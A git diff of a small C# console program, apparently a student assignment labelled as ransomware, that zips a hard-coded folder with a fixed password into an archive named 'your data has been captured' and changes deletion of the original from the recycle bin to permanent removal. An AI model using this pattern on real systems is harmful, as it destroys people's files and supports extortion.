@@ -1,35 +1,41 @@
-﻿// See https://aka.ms/new-console-template for more information
-using ICSharpCode.SharpZipLib.Zip;
-using Microsoft.VisualBasic.FileIO;
-using System;
+﻿using System;
 using System.IO;
+using ICSharpCode.SharpZipLib.Zip;
 
 class Program
 {
     static void Main(string[] args)
     {
-        Console.WriteLine("Informe o caminho da pasta que deseja compactar:");
-        string pastaOrigem = Console.ReadLine();
-
-        if (!Directory.Exists(pastaOrigem))
+        try
         {
-            Console.WriteLine("A pasta informada não existe.");
-            return;
+            string pastaOrigem = "C:\\Users\\paulo\\Desktop\\POO-TrabalhoRamsonware";
+            string arquivoDestino = "C:\\Users\\paulo\\Desktop\\SeusDadosForamCapturados.zip";
+            string senha = "senhabemmassa";
+
+            if (!Directory.Exists(pastaOrigem))
+            {
+                Console.WriteLine("A pasta informada não existe.");
+                return;
+            }
+
+            // Compactar a pasta
+            CompactarPastaComSenha(pastaOrigem, arquivoDestino, senha);
+
+            // Verifica se o arquivo ZIP foi criado com sucesso
+            if (File.Exists(arquivoDestino))
+            {
+                // Apagar a pasta original permanentemente
+                ApagarPastaPermanentemente(pastaOrigem);
+            }
+            else
+            {
+                Console.WriteLine("O arquivo ZIP não foi criado corretamente. A pasta não será apagada.");
+            }
         }
-
-        Console.WriteLine("Informe o caminho do arquivo ZIP de destino:");
-        string arquivoDestino = Console.ReadLine();
-
-        Console.WriteLine("Informe a senha para o arquivo ZIP:");
-        string senha = Console.ReadLine();
-
-        // Compactar a pasta
-        CompactarPastaComSenha(pastaOrigem, arquivoDestino, senha);
-
-        // Apagar a pasta original e enviá-la para a lixeira
-        ApagarPasta(pastaOrigem);
-
-        Console.WriteLine("Processo concluído.");
+        catch (Exception ex)
+        {
+            Console.Error.WriteLine($"Erro durante o processo: {ex}");
+        }
     }
 
     static void CompactarPastaComSenha(string pastaOrigem, string arquivoDestino, string senha)
@@ -54,6 +60,7 @@ class Program
         catch (Exception ex)
         {
             Console.WriteLine($"Erro ao compactar a pasta: {ex.Message}");
+            throw;
         }
     }
 
@@ -87,17 +94,18 @@ class Program
         }
     }
 
-    static void ApagarPasta(string pastaOrigem)
+    static void ApagarPastaPermanentemente(string pastaOrigem)
     {
         try
         {
-            // Apaga a pasta enviando para a lixeira
-            FileSystem.DeleteDirectory(pastaOrigem, UIOption.OnlyErrorDialogs, RecycleOption.SendToRecycleBin);
-            Console.WriteLine("Pasta original apagada e enviada para a lixeira.");
+            // Apaga a pasta de forma permanente
+            Directory.Delete(pastaOrigem, true); // O segundo parâmetro 'true' indica que deve apagar subdiretórios e arquivos
+            Console.WriteLine("Pasta original apagada permanentemente.");
         }
         catch (Exception ex)
         {
             Console.WriteLine($"Erro ao apagar a pasta: {ex.Message}");
+            throw;
         }
     }
 }
